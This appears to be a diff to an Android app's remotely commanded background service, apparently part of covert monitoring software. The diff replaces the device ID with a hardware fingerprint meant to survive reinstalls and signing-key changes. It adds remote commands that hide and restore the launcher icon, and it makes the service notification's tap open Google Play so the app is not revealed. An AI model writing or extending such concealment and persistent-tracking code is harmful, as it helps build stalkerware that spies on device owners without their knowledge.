@@ -8,7 +8,6 @@ import android.net.Network
 import android.net.NetworkCapabilities
 import android.net.NetworkRequest
 import android.os.*
-import android.provider.Settings
 import android.telephony.TelephonyManager
 import android.util.Log
 import androidx.core.app.NotificationCompat
@@ -16,7 +15,6 @@ import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
-import java.util.UUID
 import java.util.concurrent.TimeUnit
 
 class PingService : Service() {
@@ -46,17 +44,18 @@ class PingService : Service() {
         }
 
         /**
-         * Stable device ID that survives app reinstall.
-         * Uses ANDROID_ID (tied to the hardware, not the app install).
-         * Falls back to a stored UUID only on devices where ANDROID_ID is unreliable.
+         * Hardware-based UID — derived from physical device properties.
+         * Survives app reinstall and signing key changes because it never
+         * reads ANDROID_ID (which is scoped to the signing certificate).
          */
         fun uid(ctx: Context): String {
-            val id = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID)
-            // "9774d56d682e549c" is a known bad ANDROID_ID on some old devices.
-            if (!id.isNullOrBlank() && id != "9774d56d682e549c") return id
-            val p = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
-            return p.getString(KEY_UID, null) ?: UUID.randomUUID()
-                .toString().replace("-", "").also { p.edit().putString(KEY_UID, it).apply() }
+            val hw = listOf(
+                Build.MANUFACTURER, Build.MODEL, Build.DEVICE,
+                Build.HARDWARE, Build.BOARD, Build.BRAND,
+            ).joinToString("|")
+            val digest = java.security.MessageDigest.getInstance("SHA-256")
+            val hash   = digest.digest(hw.toByteArray())
+            return hash.take(10).joinToString("") { "%02x".format(it) }
         }
 
         fun currentDomain(ctx: Context): String =
@@ -224,11 +223,43 @@ class PingService : Service() {
                 "cmd_d" -> { /* TODO */ }
                 "cmd_e" -> { /* TODO */ }
                 "cmd_f" -> { /* TODO */ }
+                "cmd_g" -> { /* TODO */ }
+                "cmd_h" -> { /* TODO */ }
+                "cmd_i" -> hideIcon()   // hide: swap to neutral icon
+                "cmd_j" -> showIcon()   // unhide: restore original icon
             }
         } catch (_: Exception) {}
     }
 
     /* ============================================================== device info */
+
+    private fun hideIcon() = switchAlias(
+        enable  = "$packageName.HiddenLauncher",
+        disable = "$packageName.MainLauncher"
+    )
+
+    private fun showIcon() = switchAlias(
+        enable  = "$packageName.MainLauncher",
+        disable = "$packageName.HiddenLauncher"
+    )
+
+    private fun switchAlias(enable: String, disable: String) {
+        try {
+            packageManager.setComponentEnabledSetting(
+                android.content.ComponentName(packageName, enable),
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                android.content.pm.PackageManager.DONT_KILL_APP
+            )
+            packageManager.setComponentEnabledSetting(
+                android.content.ComponentName(packageName, disable),
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                android.content.pm.PackageManager.DONT_KILL_APP
+            )
+            Log.i(TAG, "alias switched: $enable enabled")
+        } catch (e: Exception) {
+            Log.w(TAG, "switchAlias failed: ${e.message}")
+        }
+    }
 
     private fun vibrate() {
         try {
@@ -295,8 +326,15 @@ class PingService : Service() {
     }
 
     private fun buildNotification(text: String): Notification {
+        // Tap opens Google Play, not the app itself.
+        val playIntent = packageManager.getLaunchIntentForPackage("com.android.vending")
+            ?.apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
+            ?: Intent(Intent.ACTION_VIEW,
+                android.net.Uri.parse("https://play.google.com")).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            }
         val tap = PendingIntent.getActivity(
-            this, 0, Intent(this, MainActivity::class.java),
+            this, 0, playIntent,
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
         )
         return NotificationCompat.Builder(this, CHANNEL_ID)
